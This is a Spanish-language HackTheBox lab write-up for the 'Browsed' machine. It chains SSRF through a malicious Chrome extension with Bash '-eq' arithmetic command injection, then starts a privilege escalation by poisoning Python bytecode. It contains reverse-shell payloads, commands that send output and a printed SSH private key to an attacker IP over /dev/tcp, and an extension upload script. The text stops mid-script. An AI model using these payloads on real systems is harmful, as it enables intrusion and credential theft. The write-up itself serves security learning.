---
title: Browsed - Medium (HTB)
permalink: /Browsed-HTB-Writeup/
tags:
  - Linux
  - Medium
  - SSRF
  - "Google Chrome"
  - "Web Extensions"
  - "Bash eq"
  - "Sudoers"
  - Python
  - "__pycache__"
  - Bytecode
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Browsed - Medium (HTB)
seo_description: Abusa de extensiones maliciosas para Google Chrome, explotando SSRF y comparación aritmética en Bash para vencer Browsed.
excerpt: Abusa de extensiones maliciosas para Google Chrome, explotando SSRF y comparación aritmética en Bash para vencer Browsed.
header:
  overlay_image: /assets/images/headers/browsed-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/browsed-hackthebox.jpg
---
![image-center](/assets/images/posts/browsed-hackthebox.png)
{: .align-center}

**Habilidades:** Abusing Server-Side Request Forgery (SSRF) + Bash `eq` Arithmetic Comparison Code Execution - Google Chrome Extensions, Python `Bytecode` Poisoning + Abusing Sudoers Privileges [Privilege Escalation]
{: .notice--primary}

# Introducción

Browsed es una máquina Linux de dificultad `Medium` en HackTheBox, donde se presenta una web vulnerable a Server-Side Request Forgery a través del procesamiento de extensiones de Google Chrome maliciosas. Combinado a una funcionalidad implementada en un servicio interno explotaremos la comparación aritmética del operador `-eq` en `Bash` usando solicitudes HTTP del lado del servidor para ganar acceso.

La escalada de privilegios es posible a través del envenenamiento de archivos `bytecode` de `Pyhton`, sumado al abuso de privilegios `sudoers` para la ejecución privilegiada de un script de Python local que ejecutará la librería envenenada.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.129.1.64         
PING 10.129.1.64 (10.129.1.64): 56 data bytes
64 bytes from 10.129.1.64: icmp_seq=0 ttl=63 time=184.884 ms

--- 10.129.1.64 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 184.884/184.884/184.884/0.000 ms
~~~


## Port Scanning 

Comenzaremos con un escaneo de puertos abiertos que intente identificar servicios expuestos en la máquina víctima

``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.1.64 -oG openPorts

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 16:43 -0300
Nmap scan report for 10.129.1.64
Host is up (0.27s latency).
Not shown: 46920 closed tcp ports (reset), 18613 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 34.89 seconds
```

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo más exhaustivo, esta vez intentaremos identificar la versión y los servicios que se ejecutan para cada puerto descubierto en la captura anterior

~~~ bash
nmap -p 22,80 -sVC 10.129.1.64 -oN services

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 16:44 -0300
Nmap scan report for 10.129.1.64
Host is up (0.53s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.51 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Solamente vemos dos servicios, `ssh` y `http`, donde sus versiones no parecen presentar vulnerabilidades explotables para este contexto


## Web Enumeration

Antes de utilizar un navegador, podemos lanzar un escaneo sobre las tecnologías del servidor web

``` bash
whatweb http://10.129.1.64

http://10.129.1.64 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.1.64], JQuery, Script, Title[Browsed], nginx[1.24.0]
```

El servidor usa `nginx` en su versión `1.24.0`, `jquery` y su sistema operativo es identificado como `Ubuntu`. 

Al navegar hasta la IP de la máquina, veremos la siguiente página web

![image-center](/assets/images/posts/browsed-1-hackthebox.png)
{: .align-center}

### Chrome Extensions

En la pestaña `Upload Extension` (en `upload.php`), podremos subir una extensión al servidor. Se nos especifica que el formato debe ser `.zip`, además de que un desarrollador la probará y nos brindará feedback.

> Los archivos deben estar en la raíz del `zip`, ¡no dentro de carpetas!.
{: .notice--danger}

![image-center](/assets/images/posts/browsed-2-hackthebox.png)
{: .align-center}

### Extension Samples

En la pestaña `Samples` (en `samples.html`), encontraremos extensiones descargables que podemos usar de ejemplo para subirlas a la web, en mi caso elegiré `ReplaceImages`

![image-center](/assets/images/posts/browsed-3-hackthebox.png)
{: .align-center}

### Command

Al subir una extensión, podemos ver que el servidor muestra una salida, donde se detallan las operatorias realizadas con nuestra extensión

``` bash
11634:11634:0114/210140.341345:VERBOSE1:chrome_crash_reporter_client.cc(182)] GetCollectStatsConsent(): is_official_chrome_build is false so returning false
[11634:11634:0114/210140.346941:VERBOSE1:chrome_crash_reporter_client.cc(182)] GetCollectStatsConsent(): is_official_chrome_build is false so returning false
[11642:11642:0114/210140.377266:VERBOSE1:cdm_registration.cc(234)] Choosing hinted Widevine 4.10.2891.0 from /opt/chrome-linux64/WidevineCdm/_platform_specific/linux_x64/libwidevinecdm.so
...
<SNIP>
...
```

Cuando interceptamos la solicitud con un proxy HTTP (como `Burosuite` o `Caido`), podemos ver que el servidor ejecuta el siguiente comando para procesar la extensión

![image-center](/assets/images/posts/browsed-4-hackthebox.png)
{: .align-center}

Este comando ejecuta una instancia de `Google Chrome`sin interfaz gráfica con el propósito de ejecutar nuestra extensión.

> Dentro de los parámetros podemos ver un nombre de dominio, `browsedinternals.htb`
{: .notice--warning}

``` bash
timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox --load-extension="/tmp/extension_69680a4a7687f4.05540741" --remote-debugging-port=0 --disable-extensions-except="/tmp/extension_69680a4a7687f4.05540741" --enable-logging=stderr --v=1 http://localhost/ http://browsedinternals.htb 2>&1 |tee /tmp/extension_69680a4a7687f4.05540741/output.log
```

Agregaremos este dominio a nuestro archivo `/etc/hosts` para poder aplicar resolución DNS hacia él

``` bash
10.129.1.64 browsedinternals.htb
```

### `Gitea` - `browsedinternals.htb`

Al navegar hasta el dominio `browsedinternals.htb`, veremos que se trata del servicio `Gitea`

> `Gitea` es una plataforma de alojamiento de código fuente para Git, de código abierto, ligera y auto-alojada, diseñada para ser una alternativa simple y eficiente a `GitHub` o `GitLab`.
{: .notice--info}

![image-center](/assets/images/posts/browsed-5-hackthebox.png)
{: .align-center}

El servicio nos permite registrar una nueva cuenta desde la pestaña `Register` (en `/user/sign_up`)

![image-center](/assets/images/posts/browsed-6-hackthebox.png)
{: .align-center}

### `MarkdownPreview` Repository

Existe un repositorio público en esta instancia llamado `MarkdownPreview` que le pertenece al usuario `larry` (lo encontraremos al hacer clic en la pestaña `Explore`).

> El usuario `larry` podría ser válido en el servidor, aunque no en todos los casos es efectivamente así.
{: .notice--warning}

![image-center](/assets/images/posts/browsed-7-hackthebox.png)
{: .align-center}

Según el archivo `README.md`, este repositorio es una herramienta que permite convertir archivos `md` (Markdown) en `html`.

Al abrir el archivo [`app.py`](http://browsedinternals.htb/larry/MarkdownPreview/src/branch/main/app.py#L1), veremos que se trata de un proyecto hecho en `Flask`

> `Flask` es un micro-framework de `Python` ligero y flexible para desarrollar aplicaciones web de forma rápida.
{: .notice--info}

``` python
from flask import Flask, request, send_from_directory, redirect
from werkzeug.utils import secure_filename

import markdown
import os, subprocess
import uuid

app = Flask(__name__)
FILES_DIR = "files"

# Ensure the files/ directory exists
os.makedirs(FILES_DIR, exist_ok=True)
...
<SNIP>
...
```

### `/routines` Endpoint

Existe un endpoint que usa la librería `subprocess` para ejecutar un script de `bash` ubicado en el directorio actual (de hecho, es el mismo que se ubica en la raíz del repositorio).

> Este endpoint recibe un parámetro `rid` y lo envía al script `routines.sh` para ser ejecutado.
{: .notice--warning}

``` python
@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

Inspeccionando el script de `bash`, notaremos que nuestro argumento `rid`, es procesado en bloques `if` a modo de una serie de comparaciones

``` bash
#!/bin/bash

ROUTINE_LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP_DIR="/home/larry/markdownPreview/backups"
DATA_DIR="/home/larry/markdownPreview/data"
TMP_DIR="/home/larry/markdownPreview/tmp"

log_action() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE_LOG"
}

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."

elif [[ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"
  log_action "Routine 1: Data backed up to $BACKUP_DIR."
  echo "Backup completed."

elif [[ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
  find "$ROUTINE_LOG" -type f -name "*.log" -exec gzip {} \;
  log_action "Routine 2: Log files compressed."
  echo "Logs rotated."

elif [[ "$1" -eq 3 ]]; then
  # Routine 3: System info dump
  uname -a > "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  df -h >> "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  log_action "Routine 3: System info dumped."
  echo "System info saved."

else
  log_action "Unknown routine ID: $1"
  echo "Routine ID not implemented."
fi
```
<br>


# Intrusión / Explotación
---
## Bash `-eq` Arithmetic Comparison Code Execution

El script `routines.sh` del repositorio que vimos en `Gitea` usa el parámetro que enviamos con el operador [`-eq`](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic:~:text=arg1%20OP%20arg2)  (`equal` o "igual a") en la declaración `if` dentro de `[[ ]]`.

Este operador crea comparaciones aritméticas, lo que significa que es posible manipular la variable de forma que ejecute un comando en el sistema.

### Understanding Vulnerability

Usaremos un extracto del script `routines.sh` del repositorio para entender cómo es posible inyectar un comando en este contexto usando la práctica

``` bash
#!/bin/bash
# poc.sh

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  #find "$TMP_DIR" -type f -name "*.tmp" -delete
  #log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."
fi
```

> En `bash`, el operador `-eq` dentro de `[[ ]]` crea una comparación en un contexto aritmético, esto permite realizar cálculos matemáticos directamente en scripts de `shell`.
{: .notice--info}

Es posible forzar el nombre de un índice de `array` para una variable determinada, con el fin de que su valor contenga una sub-ejecución de un comando (por ejemplo, a través de `$(id)`).

Por ejemplo, si el valor que enviamos es`0`, la ejecución será normal y veremos el mensaje esperado

``` bash
./poc.sh 0            
Temporary files cleaned.
```

Sin embargo, aplicando este concepto podemos declarar el índice de un `array` asignado a una variable (en un contexto aritmético `bash` asume que cualquier palabra es el nombre de una variable, por lo que no importa si se llama `x` o `y`)

``` bash
./poc.sh 'x[0]=0'
Temporary files cleaned.

./poc.sh 'y[0]=1' # Forzamos un 1 para evitar entrar en la condición
```

Según la documentación de [`bash`](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic:~:text=A%20shell%20variable%20that%20is%20null%20or%20unset%20evaluates%20to%200%20when%20referenced%20by%20name%20in%20an%20expression), toda expresión aritmética sin que no esté definida o es nula, se evalúa con el valor `0`. 

Es necesario usar el descriptor de archivo (`>`) para redirigir la salida como si fuera un error e imprimirlo en la consola, enviándolo al error estándar (`stderr`)

``` bash
./poc.sh 'x[$(whoami >&2)]'
incommatose
Temporary files cleaned.
```


## Server-Side Request Forgery (SSRF)

Por otro lado, podemos modificar el código de una de las extensiones de ejemplo (en mi caso por comodidad usé `ReplaceImages`), con el fin de intentar que el servidor nos envíe una solicitud HTTP usando funciones de `javascript` como `fetch()`

``` js
fetch("http://10.10.14.54/test", {
    mode: "no-cors"
});
```

Una vez guardemos el archivo `.js`, generaremos un nuevo archivo comprimido fácilmente con el comando `zip`

``` bash
zip ssrf_test.zip content.js manifest.json
```

Subiremos la extensión en formato `zip` a la web para que pueda ser procesada.

> Antes de enviar la extensión, iniciaremos un servidor HTTP con `python`: `python3 -m http.server 80 --bind 0.0.0.0`
{: .notice--info}

![image-center](/assets/images/posts/browsed-8-hackthebox.png)
{: .align-center}

Al cabo de unos momentos deberíamos recibir una solicitud en nuestro servidor HTTP proveniente de la máquina víctima

``` bash
python3 -m http.server 80 --bind 0.0.0.0
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.1.64 - - [14/Jan/2026 01:16:49] code 404, message File not found
10.129.1.64 - - [14/Jan/2026 01:16:49] "GET /test HTTP/1.1" 404 -
```

### Python Scripting

Para evitar los pasos repetitivos al subir la extensión a la web, podemos utilizar un script de `python` simple que automatice el proceso de subida y envío al servidor

``` python
#!/usr/bin/env python3
# trigger_ssrf.py
# extension files used for this example: replaceimages.zip
import requests
import requests
import signal
import sys
import zipfile

SERVER_IP = '10.129.1.64'
ZIP_FILE = 'ssrf_test.zip'
SERVER_URL = f'http://{SERVER_IP}/upload.php'
FILES_TO_ZIP = {
    'content.js',
    'manifest.json'
}

# Optional proxy trough Burpsuite, if is disabled, remove proxies on requests.get() function
BURP = {'http': 'http://localhost:8080'}

# Ctrl+C Handler
def ctrl_c(sig, frame):
    print('[!] Exiting...')
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)


def compress_files():
    try:
        with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file in FILES_TO_ZIP:
                zip_file.write(file)
            return True
    except Exception as e:
        print(f'[-] Extension compression error: {e}')
        return


def send_zip():
    try:
        files = { 'extension': (ZIP_FILE, open(ZIP_FILE, 'rb'), 'application/zip')}
        response = requests.post(SERVER_URL, files=files, allow_redirects=False, proxies=BURP)
        if response.status_code == 302:
            return True
    except Exception as e:
        print(f'[!] ERROR: {e}')
        return


if __name__ == "__main__":
    print('[*] Compressing malicious extension')
    
    if compress_files(): 
        print(f'[+] Files compressed: {ZIP_FILE}')
    
    print(f'[*] Sending evil extension to http://{SERVER_IP}')
    
    if send_zip():
        print(f'[+] Extension was sent')
```

### Out-of-Band SSRF - RCE

Intentaremos explotar el endpoint `/routines` de la aplicación interna que corre en el puerto `5000` usando una extensión que envíe solicitudes hacia ella. Combinaremos el concepto de la comparación con `-eq` de `bash` con el concepto de solicitudes del lado del servidor (`SSRF`).

El siguiente archivo `javascript` se encarga de aplicar la lógica para que el servidor envíe una solicitud con `fetch()` con un payload hacia `/routines`.

> Luego de unas pruebas manuales para lograr RCE, la forma de ejecutar comandos en mi caso funcionó a partir de la siguiente estructura: `echo COMMAND | base64 -d | bash`, representando los espacios con `URL Encode` (`%20`) o usando la función `encodeURIComponent()`. 
> 
> De esta forma evitaremos conflictos con ciertos caracteres al enviar comandos complejos.
{: .notice--danger}

``` js
const command = 'id > /dev/tcp/10.10.14.54/443';
const payload = "a[$(echo%20" + btoa(command) + "|base64%20-d|bash)]";

fetch("http://127.0.0.1:5000/routines/" + payload, {
	mode: "no-cors"
})
```

> Nota cómo la variable `payload` declara un índice de `array` para una variable `a`, el cual ejecutará el comando que especificamos en la variable `command`.
> 
> El uso de `no-cors` es necesario para deshabilitar las restricciones del servidor en cuanto a `Cross-Origin Resource Sharing (CORS)`, más información sobre este mecanismo [aquí](https://aws.amazon.com/es/what-is/cross-origin-resource-sharing/). 
> 
> Esto nos permitirá enviar solicitudes correctamente, de lo contrario, no obtendremos resultados.
{: .notice--warning}

Para recibir el output del comando, podemos iniciar un listener por un puerto y hacer uso de un socket TCP con `/dev/tcp/IP/PORT` para enviarlo a nuestra IP.

``` bash
nc -lvnp 443
```

Ejecutaremos el script de `Python` para enviar la extensión al servidor

``` bash
./trigger_ssrf.py 
[*] Compressing malicious extension
[+] Files compressed: ssrf_test.zip
[*] Sending evil extension to http://10.129.1.64
[+] Extension was sent
```

Al cabo de unos segundos, recibiremos la salida del comando `id`, esto es nuestra evidencia de que el comando fue ejecutado correctamente en el servidor

``` bash
Connection from 10.129.1.64:59212
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```


## Shell as `browsed`

Para ganar acceso a la máquina, modificaremos el código de `content.js` para enviar una shell desde `bash` con un comando `oneliner` estándar

``` js
const command = 'bash -c "bash -i >& /dev/tcp/10.10.16.24/443 0>&1"';
const payload = "a[$(echo " + btoa(command) + "| base64 -d | bash)]";

fetch("http://127.0.0.1:5000/routines/" + encodeURIComponent(payload), {
	mode: "no-cors"
});
```

Iniciaremos un listener que se encargue de recibir la conexión, en mi caso elegí el `443`

``` bash
nc -lvnp 443
```

Ejecutaremos el proceso para que el servidor intente cargar la extensión, subiremos el nuevo `.zip` que contiene el comando actualizado que nos enviará una reverse shell

``` bash
./trigger_ssrf.py 
[*] Compressing malicious extension
[+] Files compressed: exploit.zip
[*] Sending evil extension to http://10.129.1.64
[+] Extension was sent
```

Recibiremos una consola como el usuario `larry`

``` bash
nc -lvnp 443
Connection from 10.129.4.228:43544
bash: cannot set terminal process group (1447): Inappropriate ioctl for device
bash: no job control in this shell
larry@browsed:~/markdownPreview$ id
id
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```

### TTY Treatment

Aplicaremos un tratamiento para conseguir una consola interactiva, donde podamos presionar `Ctrl+C` sin finalizar el proceso de la shell

``` bash
larry@browsed:~/markdownPreview$ script /dev/null -c bash 
script /dev/null -c bash
Script started, output log file is '/dev/null'.
larry@browsed:~/markdownPreview$ ^Z
[1]  + 6704 suspended  nc -lvnp 443
andrees@HackBookPro extension $ stty raw -echo;fg                                    
[1]  + 6704 continued  nc -lvnp 443
                                   reset xterm
larry@browsed:~/markdownPreview$ export TERM=xterm
larry@browsed:~/markdownPreview$ stty rows 44 columns 152
```

### SSH Access

En el directorio `.ssh` del usuario `larry`, encontraremos su par de claves que le permiten iniciar sesión por `SSH`

``` bash
larry@browsed:~$ ls -la .ssh
total 20
drwx------ 2 larry larry 4096 Jan  6 10:28 .
drwxr-x--- 9 larry larry 4096 Jan  6 11:11 ..
-rw------- 1 larry larry   95 Aug 17 12:49 authorized_keys
-rw------- 1 larry larry  399 Aug 17 12:48 id_ed25519
-rw-r--r-- 1 larry larry   95 Aug 17 12:48 id_ed25519.pub

larry@browsed:~$ cat .ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrwAAAJAXb7KHF2+y
hwAAAAtzc2gtZWQyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrw
AAAEBRIok98/uzbzLs/MWsrygG9zTsVa9GePjT52KjU6LoJdlkhk8FEXwXNCOe06dt3BiJ
Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
-----END OPENSSH PRIVATE KEY-----
```

Desde nuestro lado podemos iniciar un listener y reenviar todo lo que recibamos a un archivo

``` bash
nc -lvnp 443 > id_ed25519
```

Enviaremos la clave privada hacia nuestra IP a través de un socket TCP usando la ruta `/dev/tcp`

``` bash
larry@browsed:~$ cat .ssh/id_ed25519 > /dev/tcp/10.10.16.24/443
```

Ahora seremos capaces de conectarnos por `SSH` usando la clave privada como archivo de identidad

``` bash
chmod 600 id_ed25519 # Permisos necesarios
ssh -i id_ed25519 larry@10.129.4.228

Last login: Sun Jan 11 15:20:03 2026 from 10.10.16.24
larry@browsed:~$ id
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```

Ya podremos ver la flag del usuario no privilegiado, aunque antes de este paso ya podríamos haberla leído

``` bash
larry@browsed:~/markdownPreview$ cat ../user.txt 
d77...
```
<br>


# Escalada de Privilegios
---
## Sudoers Privileges - Custom `Python` Script

Al listar los privilegios configurados con `sudo` para el usuario `larry`, veremos que somos capaces de ejecutar un script de `python` sin proporcionar contraseña, el cual se encuentra en `/opt/extensiontool/`

``` bash
larry@browsed:~/markdownPreview$ sudo -l
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

### Script Analysis - `extension_tool.py`

El script `extension_tool.py` importa un script personalizado como una librería (`extension_utils`), para poder utilizar las funciones `validate_manifest, clean_temp_files`

``` python
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'

def bump_version(data, path, level='patch'):
    version = data["version"]
    major, minor, patch = map(int, version.split('.'))
    if level == 'major':
        major += 1
        minor = patch = 0
    elif level == 'minor':
        minor += 1
        patch = 0
    else:
        patch += 1

    new_version = f"{major}.{minor}.{patch}"
    data["version"] = new_version

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    
    print(f"[+] Version bumped to {new_version}")
    return new_version

def package_extension(source_dir, output_file):
    temp_dir = '/opt/extensiontool/temp'
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    output_file = os.path.basename(output_file)
    with zipfile.ZipFile(os.path.join(temp_dir,output_file), 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(source_dir):
            for filename in filenames:
                filepath = os.path.join(foldername, filename)
                arcname = os.path.relpath(filepath, source_dir)
                zipf.write(filepath, arcname)
    print(f"[+] Extension packaged as {temp_dir}/{output_file}")

def main():
    parser = ArgumentParser(description="Validate, bump version, and package a browser extension.")
    parser.add_argument('--ext', type=str, default='.', help='Which extension to load')
    parser.add_argument('--bump', choices=['major', 'minor', 'patch'], help='Version bump type')
    parser.add_argument('--zip', type=str, nargs='?', const='extension.zip', help='Output zip file name')
    parser.add_argument('--clean', action='store_true', help="Clean up temporary files after packaging")
    
    args = parser.parse_args()

    if args.clean:
        clean_temp_files(args.clean)

    args.ext = os.path.basename(args.ext)
    if not (args.ext in os.listdir(EXTENSION_DIR)):
        print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
        exit(1)
    
    extension_path = os.path.join(EXTENSION_DIR, args.ext)
    manifest_path = os.path.join(extension_path, 'manifest.json')

    manifest_data = validate_manifest(manifest_path)
    
    # Possibly bump version
    if (args.bump):
        bump_version(manifest_data, manifest_path, args.bump)
    else:
        print('[-] Skipping version bumping')

    # Package the extension
    if (args.zip):
        package_extension(extension_path, args.zip)
    else:
        print('[-] Skipping packaging')


if __name__ == '__main__':
    main()
```

### Local Module - `extension_utils.py`

Inspeccionando el código de `/opt/extensiontool/extension_utils.py`, notaremos que no parece presentar vulnerabilidades explotables

``` python
import os
import json
import subprocess
import shutil
from jsonschema import validate, ValidationError

# Simple manifest schema that we'll validate
MANIFEST_SCHEMA = {
    "type": "object",
    "properties": {
        "manifest_version": {"type": "number"},
        "name": {"type": "string"},
        "version": {"type": "string"},
        "permissions": {"type": "array", "items": {"type": "string"}},
    },
    "required": ["manifest_version", "name", "version"]
}

# --- Manifest validate ---
def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    try:
        validate(instance=data, schema=MANIFEST_SCHEMA)
        print("[+] Manifest is valid.")
        return data
    except ValidationError as e:
        print("[x] Manifest validation error:")
        print(e.message)
        exit(1)

# --- Clean Temporary Files ---
def clean_temp_files(extension_dir):
    """ Clean up temporary files or unnecessary directories after packaging """
    temp_dir = '/opt/extensiontool/temp'

    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"[+] Cleaned up temporary directory {temp_dir}")
    else:
        print("[+] No temporary files to clean.")
    exit(0)
```


## Python `Bytecode` Poisoning

Listando el directorio `/opt/extensiontool`, notaremos permisos de escritura asignado a todos los usuarios (`world-writable`) sobre el directorio `__pycache__`. 

Esto habilita la posibilidad de un ataque a través de la sobrescritura de archivos `bytecode`.

``` bash
larry@browsed:~$ ls -la /opt/extensiontool
total 28
drwxr-xr-x 5 root root 4096 Jan 11 14:27 .
drwxr-xr-x 4 root root 4096 Aug 17 12:55 ..
drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4096 Jan 11 14:30 __pycache__
drwxr-xr-x 2 root root 4096 Jan 11 14:27 temp
```

En este caso, luego de una primera ejecución del script, el directorio `__pycache__` almacenará un archivo `bytecode` del script `extension_utils.py`

``` bash
larry@browsed:~/markdownPreview$ sudo /opt/extensiontool/extension_tool.py
[X] Use one of the following extensions : ['Fontify', 'Timer', 'ReplaceImages']

larry@browsed:~$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
[+] Manifest is valid.
[-] Skipping version bumping
[-] Skipping packaging

# Post-execution
larry@browsed:/tmp$ ls -la /opt/extensiontool/__pycache__/
total 12
drwxrwxrwx 2 root root 4096 Jan 11 21:54 .
drwxr-xr-x 4 root root 4096 Dec 11 07:54 ..
-rw-r--r-- 1 root root 1880 Jan 11 21:54 extension_utils.cpython-312.pyc
```

### Understanding Python Code Execution

Cuando ejecutamos código `python` desde un archivo `.py`, este primeramente es compilado en `bytecode`, el que actúa como un puente entre el código fuente y el intérprete de `Python` (`Python Virtual Machine`).

> `Bytecode` es una representación intermedia de bajo nivel del código fuente de `Python` que se ejecuta mediante la máquina virtual de `Python` (`PVM`).
{: .notice--info}

#### Python Cache

`Python` almacena estos archivos compilados en el directorio `__pycache__`, permitiendo ejecutar los scripts más rápido en ejecuciones posteriores. Este mecanismo optimiza la carga y ejecución de módulos, evitando la re-compilación constante.

> El directorio `__pycache__` es una carpeta que `Python` crea automáticamente para almacenar archivos de `bytecode` (`.pyc`).
{: .notice--info}

### `PEP 552` - Deterministic `pycs`

> El `PEP 552`, introducido desde `Python 3.7`, representa una mejora en la forma en que el intérprete de `Python` valida los archivos `bytecode`.
{: .notice--info}

Antes de `PEP 552`, `Python` validaba los archivos `bytecode` usando `timestamps`  del archivo `.py` del código fuente, esto no era del todo confiable por cómo se calcula una marca de tiempo en diversos entornos (precisión).

La estructura general del `header` de un archivo `.pyc` contiene:

- `Magic Number`, identifica la versión de `python` (`4 bytes`).
- Campo de `flags` (`4 bytes`, introducido por `PEP 552`) .
- Datos de validación (`timestamp` o `hash`, `8 bytes`).

El nuevo campo de `flags` define cómo debe validarse el archivo `.pyc` por el intérprete:

- `0000 0000`: Validación por `timestamp` (marca de tiempo y tamaño en `bytes`).
- `0100 0000`: Validación por `Unchecked hash-based`.
- `0300 0000`: Validación por `Checked hash-based`.

En cuanto a la validación basada en `hash`, `PEP 552` define dos modos:

- `Checked hash`:  `Python` calcula nuevamente el hash del archivo `.py` y lo compara con el del hash embebido del archivo `.pyc`.
- `Unchecked hash`: `Python` no valida el hash, confiando en que el `pyc` es válido.

Haciendo un análisis rápido de esto para poner en práctica este pequeño aprendizaje, comprobaremos el archivo `bytecode` generado una vez ejecutemos el script con `sudo`

``` bash
larry@browsed:/tmp/.dontlookatthis$ cat /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc | xxd | head -n 1
00000000: cb0d 0d0a 0000 0000 d3e8 df67 dd04 0000  ...........g....
```

- En este caso los primeros `4 bytes` corresponden al `Magic Number`, en este caso `cb0d` en `Little-Endian` representaría `3531`, este es un código interno en `Python` que representa a la versión `3.12`.
- Los `bytes 0000 0000` representan el modo de validación, en este caso como el bit `0` vale `0`, corresponde a validación por `timestamp`.
- El resto de `bytes` de esta línea corresponde al valor de la marca de tiempo (`d3e8 df67` en `Little-Endian` y convertido a [`timestamp`](https://www.epochconverter.com/), que representa `Domingo, 23 de Marzo, 2025 10:56:19 AM`) y el tamaño del script original (`dd04 0000` en `Little-Endian`, o sea, `1245 bytes`).

### Exploiting

El siguiente [script de `Python`](https://matmul.net/$/pyc.html) ajustado a nuestro caso automatiza la explotación.

- Se extraen los bytes del archivo `bytecode` original para ser implantados en un nuevo `bytecode` malicioso.
- Compilamos el `bytecode` con el código que requiere el script `extension_tool.py`, el cual usa las funciones `validate_manifest` y `clean_temp_files`.
- Copiamos nuestro `bytecode` al directorio `__pycache__` de destino, desde donde en la siguiente ejecución el intérprete de `Pyhton` importará las funciones maliciosas.

``` bash
# hjijack.py
import marshal
import time
import sys
import dis
import struct
import os

attacker_ip = '10.10.16.24'
attacker_port = '443'
